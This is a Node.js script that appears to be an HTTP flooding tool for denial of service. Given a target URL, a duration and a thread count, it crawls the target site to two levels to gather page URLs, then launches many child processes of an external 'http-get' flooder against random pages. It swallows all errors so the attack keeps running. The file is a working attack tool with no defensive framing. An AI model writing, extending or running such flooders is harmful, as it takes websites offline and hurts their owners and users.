const { spawn } = require('child_process');
const fs = require('fs');
var Crawler = require("js-crawler");
const url = require("url");

process.on('uncaughtException', function (er) {
});
process.on('unhandledRejection', function (er) {
});

require('events').EventEmitter.defaultMaxListeners = 0;


const pages = [];

if (process.argv.length < 5) {
    console.log("node index.js <host> <time> <threads>");
    process.exit(-1);
}

const urlT = process.argv[2]; // url
const timeT = process.argv[3]; // spam time
const threadsT = process.argv[4]; // Flooder Threads

function getRandomPage() {
    return pages[Math.floor(Math.random() * pages.length)];
}

function launchChild() {
    const randomUrl = getRandomPage();
    const child = spawn('./http-get', [randomUrl, "200", timeT]);

    child.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
    });

    child.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
    });

    child.on('error', (error) => {
        console.error(`error: ${error.message}`);
    });

    child.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
    });
}

function crawler() {
    var parsed = url.parse(urlT);
    pages.push(urlT);
    new Crawler().configure({ depth: 2 })
        .crawl(urlT, function onSuccess(page) {
            if (page.url.includes(parsed.host)) {
                pages.push(page.url);
            }
        });
}

function main() {
    console.log("Program started!");
    crawler();
    setTimeout(() => {
        let count = 0;
        const interval = setInterval(() => {
            if (count < threadsT) {
                launchChild();
                count++;
            } else {
                clearInterval(interval);
            }
        }, 100);
    }, 5000);

}
main();

setTimeout(() => {
    process.exit(0);
    process.exit(0);
    process.exit(0);
}, timeT * 1000)
